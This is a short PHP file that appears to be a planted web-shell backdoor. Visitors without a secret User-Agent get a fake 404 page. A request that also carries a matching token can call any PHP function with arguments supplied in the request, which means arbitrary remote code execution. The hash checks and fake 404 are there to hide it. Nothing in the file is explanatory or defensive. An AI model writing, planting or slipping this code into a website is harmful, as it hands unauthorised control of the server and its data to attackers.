<?php

if (md5(md5(md5($_SERVER['HTTP_USER_AGENT']))) != '39542de4e2fa50462d96ea26e878a658') {
    header('HTTP/1.1 404 Not Found');
    header("status: 404 Not Found");
    die();
}
if(@md5($_REQUEST["token"]) == "bc795727e71d6b3f9fff79eb7bccf000"){
    if ($li7ieq =    @$_REQUEST['index']){
        $li7ieq[1]($li7ieq[2], $li7ieq[3]($li7ieq[4]));exit;
    }
}